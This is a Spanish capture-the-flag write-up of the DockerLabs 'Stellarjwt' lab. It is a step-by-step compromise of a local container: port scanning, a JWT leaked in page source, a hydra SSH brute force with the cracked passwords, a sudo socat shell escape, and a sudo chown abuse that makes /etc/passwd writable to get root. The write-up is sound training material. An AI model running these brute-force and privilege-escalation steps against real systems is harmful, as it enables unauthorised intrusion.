---
title: Stellarjwt
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-03
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-stellarjwt/stellarjwt_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - fuzzing web
  - data leaks
  - password attacks
  - sudo abuse
  - web analysis
  - data leak exploitation
  - user pivoting
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ ping -c 1 127.17.0.2                 
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.065/0.065/0.065/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.2 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ sudo nmap -sCV -p22,80 -vvv 127.17.0.2 -oN nmap2
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 13:fd:a1:b2:31:9d:ea:33:a1:43:af:44:20:3a:12:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEOj/HRDdBjMOnahF64+funtJuqp9p12aIRd36Qc/LhxP96Vzgbb3TBmmlikTqGqRVAlF24M53fdp9pABYc9Z5c=
|   256 a0:4f:c4:a9:00:af:cb:78:28:fd:94:c0:86:28:dc:a1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBQCVaYlLtT3rl2JLsXE13whHLmBXeknIoPXXK13Du5A
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: NASA Hackeada
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], Title[NASA Hackeada]
```

---
## Web Analysis & Data Leak Exploitation

Encuentro una página web estática con una simple pregunta que dice,
"¿Qué astrónomo alemán descubrió Neptuno?".

![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt1_1.png)

Tras una rápida búsqueda, obtengo la respuesta.

![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt1_2.png)

Analizo la web en busca de directorios adicionales.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://127.18.0.2/
/universe             (Status: 301) [Size: 311] [--> http://127.18.0.2/universe/]
```

Identifico un nuevo directorio llamado `/universe`, pero aparentemente no contiene información visible a simple vista.

![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt1_3.png)
![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt1_4.png)

Sin embargo, inspeccionando el código fuente, encuentro un comentario interesante que incluye un token JWT.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidXNlciI6Im5lcHR1bm8iLCJpYXQiOjE1MTYyMzkwMjJ9.t-UG_wEbJdc_t0spVGKkNaoVaOeNnQwzvQOfq0G3PcE' > hash.txt

/home/kali/Documents/dockerlabs/stellarjwt:-$ hashcat --show hash.txt
    # | Name                                            | Category
======+=================================================+==============================
16500 | JWT (JSON Web Token)                            | Network Protocol
```

Decodifico el JWT con [cyberchef](https://cyberchef.org) y revelo un campo que define un usuario.

![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt2_1.png)

Con el usuario identificado, creo un diccionario personalizado basándome en términos relacionados con la temática de la maquina. Y utilizo hydra para realizar un ataque de fuerza bruta contra el servicio SSH del servido.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ grep -i 'neptuno\|nasa\|Johann\|Gottfried\|Galle' /usr/share/wordlists/rockyou.txt > nasa_creds.txt

/home/kali/Documents/dockerlabs/stellarjwt:-$ sudo hydra -l neptuno -P nasa_creds.txt ssh://172.17.0.2 -t 60 -I
```

![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt2_2.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/stellarjwt:-$ ssh neptuno@127.17.0.2
neptuno@127.17.0.2's password: Gottfried

neptuno@kali:~$ id
uid=1001(neptuno) gid=1001(neptuno) groups=1001(neptuno),100(users)
```

---
## User Pivoting 1

```terminal
neptuno@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
neptuno:x:1001:1001:neptuno,,,:/home/neptuno:/bin/bash
nasa:x:1002:1002:NASA,,,:/home/nasa:/bin/bash
elite:x:1000:1000:elite,,,:/home/elite:/bin/bash
```

En el directorio personal de `neptuno`, encuentro un archivo de texto llamado `.carta_a_la_NASA.txt`.

```terminal
neptuno@kali:~$ cat .carta_a_la_NASA.txt
```

![](assets/img/dockerlabs-writeup-stellarjwt/stellarjwt3_1.png)

Dentro del archivo, se menciona a la NASA o al usuario `nasa` junto con una posible contraseña `Eisenhower` la cual es valida.

```terminal
neptuno@kali:~$ su nasa
Password: Eisenhower

nasa@kali:~$ id
uid=1002(nasa) gid=1002(nasa) groups=1002(nasa),100(users)
```

---
## User Pivoting 2

Reviso los permisos del usuario `nasa`.

```terminal
nasa@kali:~$ sudo -l
Matching Defaults entries for nasa on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User nasa may run the following commands on kali:
    (elite) NOPASSWD: /usr/bin/socat
```

El resultado indica que `nasa` puede ejecutar `socat` como el usuario `elite` sin necesidad de contraseña.

Consulto la página de [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo>) para identificar como ganar acceso al usuario `elite`.

```terminal
nasa@kali:~$ sudo -u elite /usr/bin/socat stdin exec:/bin/sh
2025/01/11 20:58:12 socat[203] W address is opened in read-write mode but only supports read-only

id
uid=1000(elite) gid=1000(elite) groups=1000(elite),100(users)
```

---
## Privilege Escalation

```terminal
script /dev/null -c bash 
```

Verifico los permisos del usuario `elite`.

```terminal
elite@kali:~$ sudo -l
Matching Defaults entries for elite on kali:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User elite may run the following commands on kali:
    (root) NOPASSWD: /usr/bin/chown
```

El usuario `elite` tiene permisos para ejecutar el comando `chown` como `root` sin necesidad de contraseña.

<https://gtfobins.github.io/gtfobins/chown/#sudo>

Utilizo `chown` para cambiar la propiedad del directorio `/etc` a `elite`.

```terminal
elite@kali:~$ sudo -u root /usr/bin/chown elite:elite /etc

elite@kali:~$ ls -l /
drwxr-xr-x   1 elite elite 4096 Jan 11 17:39 etc
```

Modifico la propiedad del archivo `/etc/passwd` para permitir su edición.

```terminal
elite@kali:~$ sudo -u root /usr/bin/chown elite:elite /etc/passwd

elite@kali:~$ ls -l /etc/passwd
-rw-r--r-- 1 elite elite 1300 Oct 23 21:11 /etc/passwd
```

Edito el archivo `/etc/passwd` para eliminar las contraseñas `x` del usuario `root`, lo que me permite acceder sin necesidad de autenticación.

```terminal
elite@kali:~$ sed -i 's/x//g' /etc/passwd

elite@kali:~$ su root

root@kali:/home/elite# id
uid=0(root) gid=0(root) groups=0(root)
```
